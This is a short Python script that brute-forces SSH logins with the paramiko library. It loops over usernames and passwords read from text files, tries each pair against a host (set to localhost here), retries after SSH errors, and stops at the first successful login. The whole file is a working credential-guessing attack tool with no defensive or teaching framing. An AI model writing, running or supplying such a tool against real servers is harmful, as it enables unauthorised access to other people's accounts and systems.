import paramiko
import socket
import time


def brute_force_ssh(host, p, user, passwd):
    clt = paramiko.SSHClient()
    clt.load_system_host_keys()
    clt.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Testing {user}:{passwd}")
        clt.connect(host, p, user, passwd, timeout=3)
    except socket.error as error:
        print("SocketError", error)
        return False
    except paramiko.AuthenticationException as exception:
        print("AuthenticationException", exception)
        return False
    except paramiko.SSHException:
        print("Try again")
        time.sleep(20)
        return brute_force_ssh(host, p, user, passwd)
    else:
        return True


hostname = "127.0.0.1"
port = "22"

users_file = open("users.txt", 'r')
users = users_file.read().splitlines()
users_file.close()

passwords_file = open("passwordrs.txt", 'r')
passwords = passwords_file.read().splitlines()
passwords_file.close()

for user in users:
    for password in passwords:
        if(brute_force_ssh(hostname, port, user, password)):
            print("SUCCESS")
            exit()
